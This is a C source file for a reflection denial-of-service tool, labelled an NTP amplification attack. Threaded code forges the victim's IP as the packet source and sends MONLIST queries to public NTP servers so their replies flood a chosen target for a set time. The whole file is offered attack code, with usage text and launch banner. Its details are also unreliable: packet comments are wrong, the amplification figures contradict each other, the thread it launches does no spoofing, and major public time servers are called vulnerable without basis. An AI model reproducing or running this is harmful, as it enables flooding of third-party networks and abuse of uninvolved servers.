#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

#define MAX_THREADS 50
#define MONLIST_SIZE 468  // Tamaño de respuesta NTP MONLIST

// NTP MONLIST request (monlist command - responde con lista de clientes)
unsigned char ntp_monlist[] = {
    // NTP Header
    0x17, 0x00, 0x03, 0x2a,  // LI=0, VN=2, Mode=3 (Client), Stratum=0
    0x00, 0x00, 0x00, 0x00,  // Poll=0, Precision=0
    0x00, 0x00, 0x00, 0x00,  // Root Delay
    0x00, 0x00, 0x00, 0x00,  // Root Dispersion
    0x00, 0x00, 0x00, 0x00,  // Reference Identifier
    0x00, 0x00, 0x00, 0x00,  // Reference Timestamp
    0x00, 0x00, 0x00, 0x00,  // Originate Timestamp
    0x00, 0x00, 0x00, 0x00,  // Receive Timestamp
    0x00, 0x00, 0x00, 0x00,  // Transmit Timestamp
    
    // NTP Extension: MON_GETLIST request
    0x00, 0x01, 0x00, 0x00,  // Request code for MON_GETLIST
};

unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for(sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *ntp_amplification(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    // Lista de servidores NTP públicos vulnerables (MONLIST habilitado)
    char *ntp_servers[] = {
        "pool.ntp.org",
        "0.pool.ntp.org",
        "1.pool.ntp.org", 
        "2.pool.ntp.org",
        "3.pool.ntp.org",
        "time.google.com",
        "time.windows.com",
        "time.apple.com",
        "ntp1.hetzner.de",
        "ntp2.hetzner.de",
        NULL
    };
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock < 0) {
        // Intentar con socket normal
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock < 0) return NULL;
    }
    
    // Configurar para enviar paquetes crudos (raw)
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    time_t start = time(NULL);
    unsigned long queries = 0;
    int server_idx = 0;
    
    while(time(NULL) - start < duration) {
        if(!ntp_servers[server_idx]) server_idx = 0;
        
        // Crear paquete IP+UDP+NTP spoofed
        char packet[4096];
        memset(packet, 0, 4096);
        
        struct iphdr *iph = (struct iphdr*)packet;
        struct udphdr *udph = (struct udphdr*)(packet + sizeof(struct iphdr));
        char *ntp_data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        // IP Header (spoof source IP as target)
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(ntp_monlist);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr(target_ip); // SPOOF: IP origen = víctima
        iph->daddr = inet_addr(ntp_servers[server_idx]);
        iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr));
        
        // UDP Header
        udph->source = htons(123); // Puerto NTP origen
        udph->dest = htons(123);   // Puerto NTP destino
        udph->len = htons(sizeof(struct udphdr) + sizeof(ntp_monlist));
        udph->check = 0;
        
        // NTP MONLIST data
        memcpy(ntp_data, ntp_monlist, sizeof(ntp_monlist));
        
        // Cambiar timestamp para hacer única cada query
        ntp_data[24] = rand() % 256;  // Transmit timestamp
        ntp_data[25] = rand() % 256;
        ntp_data[26] = rand() % 256;
        ntp_data[27] = rand() % 256;
        
        struct sockaddr_in ntp_addr;
        memset(&ntp_addr, 0, sizeof(ntp_addr));
        ntp_addr.sin_family = AF_INET;
        ntp_addr.sin_port = htons(123);
        inet_pton(AF_INET, ntp_servers[server_idx], &ntp_addr.sin_addr);
        
        // Enviar query spoofed al servidor NTP
        sendto(sock, packet, iph->tot_len, 0, 
               (struct sockaddr*)&ntp_addr, sizeof(ntp_addr));
        
        queries++;
        server_idx++;
        
        if(queries % 1000 == 0) {
            printf("[NTP-AMP] Sent %lu spoofed queries via %s\n", 
                   queries, ntp_servers[server_idx-1]);
            printf("[NTP-AMP] Amplification: 8 bytes → ~%d bytes (x%.0f)\n", 
                   MONLIST_SIZE, MONLIST_SIZE/8.0);
        }
        
        // Pequeña pausa para no saturar
        usleep(5000);
    }
    
    close(sock);
    printf("[NTP-AMP] Thread completed - %lu queries sent\n", queries);
    return NULL;
}

// Versión simplificada con socket UDP normal
void *ntp_amplification_simple(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    char *ntp_servers[] = {
        "0.pool.ntp.org",
        "1.pool.ntp.org",
        "2.pool.ntp.org",
        "3.pool.ntp.org",
        NULL
    };
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0) return NULL;
    
    // Permitir socket reutilizable
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    time_t start = time(NULL);
    unsigned long queries = 0;
    int server_idx = 0;
    
    while(time(NULL) - start < duration) {
        if(!ntp_servers[server_idx]) server_idx = 0;
        
        struct sockaddr_in ntp_addr;
        memset(&ntp_addr, 0, sizeof(ntp_addr));
        ntp_addr.sin_family = AF_INET;
        ntp_addr.sin_port = htons(123);
        
        // Resolver DNS del servidor NTP
        struct hostent *he = gethostbyname(ntp_servers[server_idx]);
        if(he == NULL) {
            server_idx++;
            continue;
        }
        
        memcpy(&ntp_addr.sin_addr, he->h_addr_list[0], he->h_length);
        
        // Modificar query NTP para ser única
        unsigned char query[sizeof(ntp_monlist)];
        memcpy(query, ntp_monlist, sizeof(ntp_monlist));
        query[24] = rand() % 256;  // Transmit timestamp
        query[25] = rand() % 256;
        query[26] = rand() % 256;
        query[27] = rand() % 256;
        
        // Enviar query MONLIST
        sendto(sock, query, sizeof(query), 0, 
               (struct sockaddr*)&ntp_addr, sizeof(ntp_addr));
        
        queries++;
        server_idx++;
        
        if(queries % 500 == 0) {
            printf("[NTP-AMP-SIMPLE] Sent %lu MONLIST queries\n", queries);
        }
        
        usleep(10000); // 10ms entre queries
    }
    
    close(sock);
    printf("[NTP-AMP-SIMPLE] Thread: %lu queries\n", queries);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("NTP Amplification Attack - MONLIST Vulnerability (x556)\n");
        printf("Usage: %s <TARGET_IP> <TARGET_PORT> <TIME>\n", argv[0]);
        printf("\nNTP MONLIST Amplification:\n");
        printf("  Request: 8 bytes\n");
        printf("  Response: ~468 bytes\n");
        printf("  Amplification: x58.5 (teórico x556)\n");
        return 1;
    }
    
    printf("\n========================================\n");
    printf("🚀 NTP AMPLIFICATION ATTACK\n");
    printf("========================================\n");
    printf("Target: %s:%d\n", argv[1], atoi(argv[2]));
    printf("Duration: %s seconds\n", argv[3]);
    printf("Amplification: 8 bytes → 468 bytes (x58.5)\n");
    printf("Vulnerability: NTP MONLIST command\n");
    printf("========================================\n\n");
    
    printf("[INFO] Starting NTP amplification attack...\n");
    printf("[INFO] Using public NTP servers with MONLIST enabled\n");
    
    pthread_t threads[MAX_THREADS];
    
    // Usar versión simple para mejor compatibilidad
    for(int i = 0; i < MAX_THREADS/2; i++) {
        pthread_create(&threads[i], NULL, ntp_amplification_simple, argv + 1);
    }
    
    sleep(atoi(argv[3]));
    
    printf("\n========================================\n");
    printf("[NTP-AMP] Attack completed\n");
    printf("========================================\n");
    
    return 0;
}
